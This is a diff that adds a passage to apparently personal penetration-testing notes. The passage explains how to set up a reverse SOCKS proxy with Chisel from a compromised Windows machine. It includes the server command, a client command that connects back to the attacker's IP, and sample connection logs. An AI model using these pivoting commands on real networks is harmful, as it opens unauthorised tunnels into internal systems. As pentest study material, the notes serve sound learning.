@@ -477,7 +477,23 @@ Exploit target:
 
 ### Reverse SOCKS Proxy
 * A reverse SOCKS proxy allows you to route traffic from a compromised machine back to your attacking machine. This allows your attacking machine to interact with your internal machine through the compromised machine, as the internal machne seens the connection as being from the legitimate compromised machine.
-* You can use Chisel to create a reverse SOCKS proxy, which creates a network bridge between the attacking machine and the compromised machine so yu can access this internal machine directly. You'll first need to install Chisel on your attacking machine (server) and your initial compromised machine (client). You can set up the Chisel server on the attacking machine with `chisel server -p 8000 --reverse`. 
+* You can use Chisel to create a reverse SOCKS proxy, which creates a network bridge between the attacking machine and the compromised machine so yu can access this internal machine directly. You'll first need to install Chisel on your attacking machine (server) and your initial compromised machine (client). You can set up the Chisel server on the attacking machine with `chisel server -p 8000 --reverse`. This will set the server to listen on port 8000 for incoming connections and `--reverse` specifies the server to handle reverse connections, working as a proxy. Chisel will then return an output like below to confirm it's listening on the specified port:
+```
+2025/03/11 13:49:32 server: Reverse tunnelling enabled
+2025/03/11 13:49:32 server: Fingerprint Um+9m1wBbhHhJx9X8Q5j+eWTheEjk3FQP4/LENsaLZw=
+2025/03/11 13:49:32 server: Listening on http://0.0.0.0:8000
+```
+* To connect via your compromised machine, you'll first need to transfer `chisel_windows.exe` from your attacking machine to your target. Next open a command prompt and navigate to the `chisel_windows.exe` directory. Then create a Chisel client in the same with `chisel_windows.exe client <Attacking Machine IP Address>:8000 R:socks`. This command will connect the client to the Chisel server via port 8000. The `R:socks` option sets up a reverse SOCKS proxy, completing the two-way connection. The output will confirm the completed connect. Back on your attacking machine, the server will also confirm the connection and confirm the port the local SOCKS5 proxy is listening and accepting connection requests on its default port 1080:
+```
+
+2025/03/11 13:50:57 client: Connecting to ws://<Attacking Machine IP Address>:8000                                                       
+2025/03/11 14:50:58 client: Connected (Latency 2.0432ms)
+
+// Attacking Machine
+2025/03/11 13:49:32 server: Listening on http://0.0.0.0:8000
+2025/03/11 14:50:58 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
 
 
 
